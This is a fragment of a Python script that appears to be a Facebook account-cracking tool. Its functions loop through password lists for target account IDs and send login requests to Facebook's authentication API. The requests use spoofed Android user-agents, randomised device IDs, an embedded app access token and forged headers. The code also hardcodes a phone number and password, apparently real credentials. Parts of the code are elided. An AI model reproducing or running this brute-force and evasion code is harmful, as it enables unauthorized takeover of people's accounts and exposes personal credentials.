...
⠄⠄⠄⠄⠄⠄⣀⣀⣤⣤⣴⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣦⣤⣤⣄⣀⡀⠄⠄⠄⠄⠄
 ...
 \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mVersion : 2.17
 \033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
...
def api1(ids,names,passlist):
        try:
            ...
            for pw in passlist:
                ...
                ua_string = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/Orca-Android;FBAV/436.0.0.45.111;FBPN/com.facebook.orca;FBLC/fr_GN;FBBV/541554436;FBCR/Orange GN;FBMF/samsung;FBBD/samsung;FBDV/SM-A235F;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.8125,width=1080,height=2207};FB_FW/1;];[FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/548243065;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A525F;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2186};FB_FW/1;];FBAN[FBAN/Orca-Android;FBAV/440.0.0.30.352;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/554361140;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-F936B;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=904,height=2103};FB_FW/1;];FBAN[FBAN/Orca-Android;FBAV/440.0.0.30.352;FBPN/com.facebook.orca;FBLC/en_US;FBBV/554361140;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A235F;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.8125,width=1080,height=2199};FB_FW/1;];[FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/548243065;FBCR/No service;FBMF/vivo;FBBD/vivo;FBDV/vivo 1920;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2141};FB_FW/1;];[FBAN/Orca-Android;FBAV/424.0.0.25.113;FBPN/com.facebook.orca;FBLC/en_US;FBBV/510343531;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBDV/moto g play - 2023;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1439};FB_FW/1;];[FBAN/Orca-Android;FBAV/426.0.0.27.102;FBPN/com.facebook.orca;FBLC/in_ID;FBBV/515381945;FBCR/Telkomsel;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/RNE-L22;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=2050};FB_FW/1;]"
                li = ['28','29','210']
...
def api2(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";FBAN/FB4A;FBAV/196.0.0.87;FBBV/660037827;FBDM/{density=1.75,width=720,height=1488};FBLC/en_GB;FBRV/219897859;FBCR/Far EasTone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A107F;FBSV/9.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                        ...
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data={'adid': '914dedba-d3b6-42df-8e55-62d9955dbc16', 'format': 'json', 'device_id': 'd3a95a15-98fb-429a-b411-e4aea7283d7b', 'email': '03338468700', 'password': 'khankhan', 'generate_analytics_claim': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': 'd3a95a15-98fb-429a-b411-e4aea7283d7b', 'credentials_type': 'device_based_login_password', 'generate_session_cookies': '1', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'machine_id': 'qWD97ZhG63ep4YkHRT3iZi9_', 'login_location_accuracy_m': '1.0', 'meta_inf_fbmeta': '', 'advertiser_id': '914dedba-d3b6-42df-8e55-62d9955dbc16', 'encrypted_msisdn': '', 'currently_logged_in_userid': '0', 'locale': 'en_PK', 'client_country_code': 'PK', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                        headers = {'content-type': 'application/x-www-form-urlencoded', 'x-fb-sim-hni': '31878', 'x-fb-connection-type': 'unknown', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'api_key': '8114af471d039628db5c68cb127af936', 'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 10; Infinix X690B Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/236.0.0.24.108;FBBV/405428495;FBRV/0;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X690B;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.97,width=720,height=1612};FB_FW/1;]', 'x-fb-net-hni': '27203', 'x-fb-connection-bandwidth': '21056200', 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-friendly-name': 'authenticate', 'accept-encoding': 'gzip, deflate', 'x-fb-http-engine': 'Liger'}
...
def rndm(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/49.0.0.3956;FBBV/66014975;[FBAN/MobileAdsManagerAndroid;FBAV/247.0.0.42.116;FBBV/182642072;FBDM/{density=2.625,width=1080,height=1920};FBLC/hr_BA;FBRV/184895505;FBCR/MTN;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.adsmanager;FBDV/M1803D5XA;FBSV/8.1.1;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/MessengerLite;FBAV/457.0.0.9308;FBBV/959964178;FBDM/{density=3.0,width=1080,height=1812};FBLC/es_CH;FBRV/959964178;FBCR/ental;FBMF/Lge;FBBD/lge;FBPN/com.facebook.mlite;FBDV/LM-Q310N;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/MobileAdsManagerAndroid;FBAV/56.0.0.3134;FBBV/5113282;FBDM/{density=3.0,width=1080,height=2480};FBLC/en_Us;FBCR/Roshan Af;FBMF/Lge;FBBD/lge;FBPN/com.facebook.adsmanager;FBDV/LMX540HM;FBSV/9.0;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/MobileAdsManagerAndroid;FBAV/287.0.0.48269;FBBV/677397029;FBDM/{density=2.0,width=720,height=1352};FBLC/ar_QA;FBRV/677397029;FBCR/Afghan Telecom;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.adsmanager;FBDV/2201116TG;FBSV/11.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
